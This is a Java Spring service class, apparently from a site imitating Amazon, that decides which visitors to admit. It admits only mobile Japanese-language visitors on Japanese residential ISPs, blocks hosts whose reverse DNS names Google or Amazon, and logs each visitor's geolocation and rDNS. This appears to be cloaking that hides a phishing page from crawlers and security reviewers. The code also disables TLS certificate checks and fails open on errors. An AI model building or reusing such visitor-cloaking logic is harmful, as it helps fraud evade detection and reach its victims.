package com.kidd.amazon.service;

import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.ssl.DefaultTrustManager;
import cn.hutool.http.ssl.SSLSocketFactoryBuilder;
import cn.hutool.http.useragent.UserAgent;
import cn.hutool.http.useragent.UserAgentUtil;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.alibaba.fastjson.JSON;
import com.kidd.amazon.common.CmdUtils;
import com.kidd.amazon.common.IpUtils;
import com.kidd.amazon.task.AsyncTask;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.CollectionUtils;
import org.springframework.util.StringUtils;

import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpSession;
import java.io.File;
import java.nio.charset.Charset;
import java.time.Clock;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.util.*;

@Service
@Slf4j
public class AuthUserService {

    private static String authUa = "ja";

    //private static String ipInterfaceUrl = "https://api.ip.sb/geoip/";
    // private static String ipInterfaceUrl = "https://www.baidu.com/s?wd=";
    private static String ipInterfaceUrl = "http://ip-api.com/json/";
    //private static String ipInterfaceUrl = "http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=";

    @Autowired
    private CmdUtils cmdUtils;

    @Autowired
    private AsyncTask asyncTask;

    @Autowired
    private CacheService cacheService;

    public boolean auth(HttpServletRequest request) {
        //ip白名单
        String ip = IpUtils.getIpAddress(request);
        String url = request.getRequestURI();

        //已经验证过的用户
        if (null != cacheService.getCommonCache(ip) && !StringUtils.isEmpty(url) && "/" != url) {
            Integer cache = (Integer) cacheService.getCommonCache(ip);
            if (cache == 1) {
                return true;
            } else if (cache == -1) {
                return false;
            }
        }

        //白名单
        List<String> whiteList = getWhiteListIp();
        if (!CollectionUtils.isEmpty(whiteList)) {
            if (whiteList.contains(ip)) {
                return true;
            }
        }
        boolean authBool = auth2(request);
        if (authBool) {
            cacheService.setCommonCache(ip, 1);
        } else {
            cacheService.setCommonCache(ip, -1);
        }
        return authBool;
    }

    public boolean auth2(HttpServletRequest request) {
        String ip = IpUtils.getIpAddress(request);
        String ul = request.getHeader("Accept-Language");
        String uaStr = request.getHeader("User-Agent");
        LocalDateTime localDateTime = LocalDateTime.now(Clock.system(ZoneId.of("+9")));
        String dateTime = DateUtil.format(localDateTime, "yyyy-MM-dd HH:mm:ss");
        String ipInfo = "";
        try {
            //如果不是手机端的pass
            Boolean isMobile = false;
            UserAgent ua = UserAgentUtil.parse(uaStr);
            isMobile = ua.isMobile();
            if (!isMobile) {
                return false;
            }
            ipInfo = HttpRequest.get(ipInterfaceUrl + ip)
                    .setSSLSocketFactory(SSLSocketFactoryBuilder.create().setTrustManagers(new DefaultTrustManager()).build())
                    .header(Header.USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36")//头信息，多个头信息多次调用此方法即可
                    .header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                    .header("accept-encoding", "gzip, deflate, br")
                    .header("accept-language", "zh-CN,zh;q=0.9,ja;q=0.8,en-US;q=0.7,en;q=0.6")
                    .header("cookie", "__cfduid=d534012ed48873bad8487bfd1d20040821613906936")
                    .timeout(5000)//超时，毫秒
                    .execute()
                    .body();
            JSONObject jObj = JSONUtil.parseObj(ipInfo);
            String country = (String) jObj.get("countryCode");
            Map<String, String> ipHash = new HashMap<>();
            if (jObj != null) {
                ipHash.put("country", jObj.getStr("country", ""));
                ipHash.put("region", jObj.getStr("region", ""));
                ipHash.put("regionName", jObj.getStr("regionName", ""));
                ipHash.put("city", jObj.getStr("city", ""));
                ipHash.put("zip", jObj.getStr("zip", ""));
                ipHash.put("isp", jObj.getStr("isp", ""));
            }
            HttpSession session = request.getSession();
            Map<String, String> userInfoMap = (LinkedHashMap<String, String>) session.getAttribute("userInfo");
            userInfoMap.put("ipinfo", JSON.toJSONString(ipHash));

            //2、校验rdns
            String rdnsResult = cmdUtils.queryRdns(ip);
            userInfoMap.put("rdns", rdnsResult);
            session.setAttribute("userInfo", userInfoMap);
            if (!jObj.containsKey("countryCode")) {
                log.error("query countryCode error:{},{}", ip, ipInfo);
            }
            if (!StringUtils.isEmpty(ul) && !ul.toLowerCase().contains(authUa)) {
                return false;
            }
            if (jObj.containsKey("countryCode") && !country.toLowerCase().contains("jp")) {
                return false;
            }
            if (!StringUtils.isEmpty(rdnsResult) && rdnsResult.toLowerCase().contains("server can't find")) {
                log.info("server can't find:" + request.getRequestURI() + "\n" + ipInfo + "\n" + rdnsResult);
                return true;
            }
            if (!StringUtils.isEmpty(rdnsResult) && rdnsResult.toLowerCase().contains("name")) {
                if (rdnsResult.toLowerCase().contains("google") || rdnsResult.toLowerCase().contains("amazon")) {
                    return false;
                }
                if (rdnsResult.toLowerCase().contains(".jp")
                        || rdnsResult.toLowerCase().contains("bbtec.net")
                        || rdnsResult.toLowerCase().contains("kddi.com")
                        || rdnsResult.toLowerCase().contains("west.v6connect.net")) {
                    log.info("auth success:" + request.getRequestURI() + "\n" + ipInfo + "\n" + rdnsResult);
                    return true;
                }
                return false;
            }
            return false;
        } catch (Exception e) {
            log.error("auth error:" + e.getMessage() + "\n" + ip + "\n" + ipInfo + "\n" + ul + "\n" + uaStr);
            return true;
        }
    }

    public List<String> getWhiteListIp() {
        String whiteIpPath = "/root/whiteIp.txt";
        if (!FileUtil.exist(whiteIpPath)) {
            File white = FileUtil.newFile(whiteIpPath);
            FileUtil.appendString("", white, Charset.defaultCharset());
        }
        List<String> whiteIp = FileUtil.readLines(whiteIpPath, Charset.defaultCharset());
        return whiteIp;
    }
}
